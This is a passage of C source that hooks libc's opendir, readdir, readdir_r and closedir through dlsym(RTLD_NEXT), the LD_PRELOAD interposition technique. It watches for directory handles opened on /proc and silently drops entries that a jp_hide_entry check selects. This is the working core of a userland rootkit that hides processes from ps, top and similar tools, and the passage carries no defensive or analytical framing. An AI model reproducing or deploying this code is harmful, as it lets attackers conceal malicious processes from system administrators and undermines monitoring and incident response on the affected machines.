        ssize_t l;
        snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", fd);
        l = readlink(fdpath, target, sizeof(target) - 1);
        if (l > 0) {
            target[l] = 0;
            if (strcmp(target, "/proc") == 0) jp_dir_add((void *)d);
        }
    }
    return d;
}

int closedir(DIR *dirp) {
    static closedir_fn real = NULL;
    if (!real) real = (closedir_fn)dlsym(RTLD_NEXT, "closedir");
    jp_dir_del((void *)dirp);
    return real(dirp);
}

struct dirent *readdir(DIR *dirp) {
    static readdir_fn real = NULL;
    if (!real) real = (readdir_fn)dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = real(dirp)) != NULL) {
        if (!jp_hide_entry(dirp, e->d_name)) return e;
    }
    return e;
}

int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
    static readdir_r_fn real = NULL;
    if (!real) real = (readdir_r_fn)dlsym(RTLD_NEXT, "readdir_r");
    int rc;
    do {
        rc = real(dirp, entry, result);
    } while (rc == 0 && *result != NULL && jp_hide_entry(dirp, (*result)->d_name));
    return rc;
}

